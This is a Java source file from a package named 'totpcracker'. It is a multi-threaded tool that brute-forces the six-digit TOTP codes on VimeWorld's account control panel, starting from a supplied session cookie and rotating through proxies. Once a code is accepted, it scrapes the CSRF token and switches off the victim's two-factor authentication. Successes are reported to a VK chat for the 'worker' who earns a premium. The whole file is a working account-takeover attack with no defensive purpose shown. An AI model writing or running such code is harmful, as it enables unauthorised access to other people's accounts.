package pro.delfik.totpcracker;

import org.json.JSONException;
import org.json.JSONObject;
import pro.delfik.DataIO;
import pro.delfik.net.*;
import pro.delfik.vk.VKBot;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.stream.Collectors;

import static pro.delfik.net.NetUtil.*;

public class VimeWorldLogin extends PostArchetype {

	public static final String vw2faUrl = "https://cp.vimeworld.ru/login_2fa";
	public static final String vwMgrUrl = "https://cp.vimeworld.ru/security";
	public static final String vwSecUrl = "https://cp.vimeworld.ru/ajax/security.php";

	public static final CookieCutter cfduid = new CookieCutter("__cfduid", "ID сессии CloudFlare");
	public static final CookieCutter sessionCookie = new CookieCutter("PHPSESSID", "ID сессии VimeWorld");
	public static volatile int passed;
	private volatile String csrfToken;
	private volatile boolean forwardMode;

	public VimeWorldLogin(String session) {
		super(sessionCookie.cut(session));
	}

	public static Worker[] workers;
	public static volatile Queue<Proxy> QUEUED_PROXIES = new ConcurrentLinkedQueue<>();
	public static String nickname;
	private static volatile boolean blocked;

	public static void block() {
		blocked = true;
		for (Worker worker : workers) if (worker != null) worker.block();
	}

	public static void main(String... args) throws Exception {
		List<String> proxiesAddr = DataIO.read("proxies.txt");
		List<Proxy> proxies = proxiesAddr == null ? new ArrayList<>() : proxiesAddr.stream().map(p -> {
			String[] split = p.split(":");
			int port = split.length == 0 ? 8080 : Integer.parseInt(split[1]);
			return new Proxy(Proxy.Type.HTTP, new InetSocketAddress(split[0], port));
		}).collect(Collectors.toList());

		String session = DataIO.readFile("session.txt");
		Map<String, String> config = DataIO.readConfig("config.txt");
		nickname = config.getOrDefault("worker-name", NetUtil.getComp());

		VKBot.I = new VKBot(config.get("vk-group"), config.get("vk-token"));

		proxies.add(Proxy.NO_PROXY);

		VimeWorldLogin at = new VimeWorldLogin(session);
		report("\uD83D\uDC68\u200D\uD83D\uDD27 Новый рабочий - " + nickname + "\n\uD83C\uDF0D Количество прокси - " + proxies.size(), false);

		at.lifecycle(Proxy.NO_PROXY, "testcode");

		workers = new Worker[10];
		for (int i = 0; i < workers.length; i++) {
			Proxy proxy = proxies.get(i);
			workers[i] = new Worker(at);
			workers[i].start();
		}

		new Thread(() -> {
			while (true) {
				QUEUED_PROXIES = new ConcurrentLinkedQueue<>(proxies);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					break;
				}
			}
		}).start();

		new Thread(() -> {
			while (!blocked) {
				try {
					Thread.sleep(60000);
				} catch (InterruptedException ex) {
					break;
				}
				int fuckups = 0;
				int success = 0;
				for (Worker worker : workers) {
					if (worker == null) continue;
					fuckups += worker.fuckups;
					success += worker.successfulCodes;
					worker.fuckups = 0;
					worker.successfulCodes = 0;
				}
				int passed = VimeWorldLogin.passed;
				VimeWorldLogin.passed = 0;
				report(nickname + ": " + success + "s, " + fuckups + "f, " + passed + " успешных попыток", true);
			}
		}).start();

		Scanner sc = new Scanner(System.in);
		sc.useDelimiter("\n");
		String next;
		while (!"stop".equals(next = sc.next())) {
			//			at.lifecycle(Proxy.NO_PROXY, next);
			//			Response r = at.execute(next.split(" ")).execute(Proxy.NO_PROXY);
			System.out.println("Custom code: " + next);
			at.lifecycle(Proxy.NO_PROXY, next);
			//			System.out.println(r);
			//			System.out.println(new String(r.getBody()));
			//			System.out.println(r.getHeader("location"));
			//			System.out.println(new Request("https://cp.vimeworld.ru/ajax/security.php", Method.POST)
			//					.body("action", "totp-disable")
			//					.body("totp", next)
			//					.header("referrer", "https://cp.vimeworld.ru")
			//					.execute(Proxy.NO_PROXY));
		}

	}

	@Override
	public Request execute(String... args) {

		Request request = new Request(vw2faUrl, Method.POST);
		request.header("Content-Type", CONTENTTYPE);
		request.header("User-Agent", USERAGENT);

		getCookies().forEach(request::cookie);

		if (args.length > 1) {
			if (args[1].equals("off")) {
				request.address(vwSecUrl);
				request.body("action", "totp-disable");
				request.body("totp", args[0]);
				request.body("csrf_token", args[2]);
				request.header("referer", "https://cp.vimeworld.ru/security");
				request.header("x-requested-with", "XMLHttpRequest");
			} else if (args[1].equals("get")) {
				request.address(vwMgrUrl);
			}
		} else {
			request.body("totp", args[0]);
			request.body("continue", "Продолжить");
		}

		return request;

	}

	public String randomTotpCode() {
		return leadingZeroes((long) (Math.random() * 1_000_000), 6);
	}

	public void lifecycle(Proxy proxy, String code) throws Exception {

		if (forwardMode) {
			disableTotp(code);
			return;
		}
		Response response = accept(proxy, code);
		if (blocked) return;

		int http = response.getCode();
		String color;
		switch (http) {
			case 200:
				color = "\u001b[32m";
				break;
			case 302:
				color = "\u001b[33m";
				passed++;
				break;
			case 503:
			default:
				color = "\u001b[31m";
				break;
		}
		String location = response.getHeader("location");
		System.out.println(Thread.currentThread().getName() + " - " + code + ": " + color + http + " \u001b[0m" + location);
		if ("index".equals(location)) {
			if (code.equals("testcode")) forwardMode = true;
			else block();
			setupDisableTotp(code);
		}
	}

	private void setupDisableTotp(String code) throws Exception {
		report("\uD83D\uDEA8 Рабочий " + nickname + " получил доступ к личному кабинету по коду " + code, true);
		Response response = accept(Proxy.NO_PROXY, code, "get");
		String html = new String(response.getBody());
		String s = "csrf_token: '";
		int index = html.indexOf(s);
		int offset = index + s.length();
		csrfToken = html.substring(offset, offset + 64);
		System.out.println(csrfToken);

		if (!"testcode".equals(code)) disableTotp(code);

	}

	private static final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss dd MMM yyyy");

	private void disableTotp(String code) throws Exception {
		Response res = accept(Proxy.NO_PROXY, code, "off", csrfToken);
		String s = new String(res.getBody());
		if (!s.isEmpty()) try {
			JSONObject jsonObject = new JSONObject(s);
			String state = jsonObject.getString("state");
			if (state.equals("success")) {
				report("✅ Двухэтапная авторизация отключена.\n" +
								"✅ Рабочий, которому полагается премия - " + nickname + "\n" +
								"✅ Сгенерированный код - " + code + "\n" +
								"✅ Дата и время отключения - " + sdf.format(new Date()),
						false);
				System.out.println("\u001b[32mACCESS GRANTED: " + code);
				System.exit(0);
			} else {
				String error = jsonObject.getString("msg");
				if (error.contains("уже")) {
					System.exit(0);
				} else if (error.contains("неверный код")) {
					if (!forwardMode) {
						unblock();
						report(nickname + ": подошёл чей-то другой код, у меня " + code + " и он не подошёл (ошибка " + jsonObject + ")", true);
						forwardMode = true;
						return;
					}
				}
			}

			System.out.println(s);
		} catch (JSONException ex) {
			report("ПРОИЗОШЁЛ ПИЗДЕЦ У " + nickname + ", " + ex.getMessage() + "\n\n" + s, false);
		}
	}

	private static void unblock() {
		blocked = false;
		for (Worker worker : workers) if (worker != null) worker.unblock();
	}

	public static String leadingZeroes(long number, int chars) {
		return leadingZeroes(String.valueOf(number), chars);
	}

	public static String leadingZeroes(String s, int chars) {
		int pad = Math.max(chars - s.length(), 0);
		String zeroes = new String(new char[pad]);
		return zeroes.replace('\0', '0') + s;
	}

	public static void report(String msg, boolean musor) {
		VKBot.I.messages().send(2000000002 + (musor ? 1 : 0), msg);
	}

}
